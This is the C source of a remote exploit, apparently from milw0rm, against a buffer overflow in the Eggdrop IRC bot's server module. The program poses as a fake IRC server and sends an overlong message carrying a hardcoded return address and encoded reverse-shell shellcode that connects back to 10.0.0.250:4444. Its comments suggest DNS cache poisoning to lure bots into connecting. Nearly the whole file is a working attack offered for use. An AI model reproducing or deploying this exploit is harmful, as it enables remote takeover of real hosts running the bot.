/* 
  Eggdrop Server Module Message Handling Remote Buffer Overflow Vulnerability
  http://www.securityfocus.com/bid/24070
  discovered by Bow Sineath
  tested on eggdrop 1.6.18 / linux 2.4

  -exploit is a fake ircd

  replace shellcode.. strip 0x00,0x0a and a few more probably.
  remember to add \n at end of shellcode.
  poison some dns cache or .jump
  play.

  -bangus/magnum
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <arpa/inet.h>

#define LISTENPORT 6667
#define BACKLOG 3
#define RETADDR 0xbffff7b9


/*
 * linux/x86/shell_reverse_tcp - 99 bytes
 * http://www.metasploit.com
 * Encoder: x86/shikata_ga_nai
 * LPORT=4444, LHOST=10.0.0.250
 */

unsigned char shellcode[] =
	"\xbf\x1a\x2f\xf0\x55\xdb\xc9\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
	"\x13\x31\x7b\x12\x83\xeb\xfc\x03\x61\x21\x12\xa0\xa4\xe6\x81"
	"\x08\x95\x72\x24\xe5\x7f\xdb\xa1\x18\xb2\x5b\x22\x83\xfc\x63"
	"\x88\xb4\xb5\xe2\xeb\xee\x1f\x7d\x06\x11\x9f\x87\x70\x79\x8e"
	"\x2b\x3e\x1f\xe3\x5a\x21\x6f\x65\x0d\xf3\xc3\xe0\x4c\xb0\x2e"
	"\x72\xdc\x5f\x9e\x5d\x92\xf7\x88\x8e\x36\x61\x27\x59\x55\x23"
	"\xe4\xd0\x7b\x74\x01\x2f\xfb\x75\x16"
	"\n";           

char *req=
":hybrid7.debian.local NOTICE AUTH :*** Looking up your hostname...\n"
":hybrid7.debian.local NOTICE AUTH :*** Checking Ident\n"
":hybrid7.debian.local NOTICE AUTH :*** No Ident response\n"
":hybrid7.debian.local NOTICE AUTH :*** Your forward and reverse DNS do not match, ignoring hostname.\n"
":hybrid7.debian.local 001 tata :Welcome to the debian Internet Relay Chat Network tata\n"
":hybrid7.debian.local 002 tata :Your host is hybrid7.debian.local[127.0.0.1/6667], running version hybrid-7.2.2.dfsg.1-debian-3\n"
":hybrid7.debian.local 003 tata :This server was created Dec  6 2006 at 19:21:25\n"
":hybrid7.debian.local 004 tata hybrid7.debian.local hybrid-7.2.2.dfsg.1-debian-3 DGabcdfgiklnorsuwxyz biklmnopstveIh bkloveIh\n"
":hybrid7.debian.local 005 tata CALLERID CASEMAPPING=rfc1459 DEAF=D KICKLEN=160 MODES=4 NICKLEN=15 PREFIX=(ohv)@%+ STATUSMSG=@%+ TOPICLEN=350 NETWORK=debian MAXLIST=beI:25 MAXTARGETS=4 CHANTYPES=#& :are supported by this server\n"
":hybrid7.debian.local 005 tata CHANLIMIT=#&:15 CHANNELLEN=50 EXCEPTS=e INVEX=I CHANMODES=eIb,k,l,imnpst AWAYLEN=160 KNOCK ELIST=CMNTU SAFELIST :are supported by this server\n"
":hybrid7.debian.local 251 tata :There are 0 users and 3 invisible on 1 servers\n"
":hybrid7.debian.local 254 tata 1 :channels formed\n"
":hybrid7.debian.local 255 tata :I have 3 clients and 0 servers\n"
":hybrid7.debian.local 265 tata :Current local users: 3  Max: 3\n"
":hybrid7.debian.local 266 tata :Current global users: 3  Max: 3\n"
":hybrid7.debian.local 250 tata :Highest connection count: 3 (3 clients) (10 connections received)\n"
":hybrid7.debian.local 375 tata :- hybrid7.debian.local Message of the Day - \n"
":hybrid7.debian.local 376 tata :End of /MOTD command.\n"
":tata!ab@i.love.debian.org MODE tata :+i\n";

int main() {

	int s,conn;
	struct sockaddr_in addr, cli_addr;
	int size = sizeof(struct sockaddr_in);
	unsigned long retaddr=RETADDR;
	char data[393+sizeof(shellcode)];

	if ((s = socket(AF_INET, SOCK_STREAM,0)) == -1) {
    		perror("socket");
    		return(-1);
	}

	memset((char *) &addr, 0, sizeof(struct sockaddr_in));

	addr.sin_family = AF_INET;
	addr.sin_port = htons(LISTENPORT);
	addr.sin_addr.s_addr = htonl(INADDR_ANY);

	if (bind(s,(struct sockaddr *)&addr, size) == -1) {
    		perror("bind");
		return(-1);
	}
	
	if (listen(s,BACKLOG) == -1) {
    		perror("listen");
		return(-1);
	}

	while(1) {

		conn = accept(s, (struct sockaddr *)&cli_addr, &size);
		if (conn == -1) {
			perror("accept");
			return (-1);		
		}

		printf("connection from %s.\n", inet_ntoa(cli_addr.sin_addr));

		sleep(1);

		printf("sending greeting.\n");
		send(conn,req,strlen(req),0);

		sleep(1);

	        memset(data, 0x41, sizeof(data));
	        memcpy(data,":",1); 
	        memcpy(data+365, &retaddr, sizeof(long));
	        memcpy(data+369," PRIVMSG Lamestb0t :test",24);
		memcpy(data+393,shellcode,sizeof(shellcode));

		printf("sending %d bytes of data.\n",sizeof(data));
		send(conn,data, sizeof(data), 0);
	
		sleep(10);

		printf("closing connection.\n");
		close(conn);

	}

	close(s);

	return 0;
}

// milw0rm.com [2007-10-10]